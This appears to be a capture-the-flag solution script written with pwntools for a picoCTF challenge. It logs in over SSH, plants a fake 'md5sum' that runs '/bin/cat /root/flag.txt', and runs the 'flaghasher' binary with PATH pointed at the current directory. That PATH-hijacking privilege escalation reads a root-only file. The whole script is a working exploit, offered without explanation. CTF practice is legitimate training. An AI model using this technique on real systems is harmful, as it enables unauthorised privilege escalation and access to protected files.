from pwn import *

p = ssh(user="ctf-player", host="shape-facility.picoctf.net", port=52814, password="3f39b042")
p.run('echo #!/bin/sh > md5sum')
p.run('echo "/bin/cat /root/flag.txt" >> md5sum')
p.run('chmod +x md5sum')
r = p.process('./flaghasher', env={"PATH": "."})

r.interactive()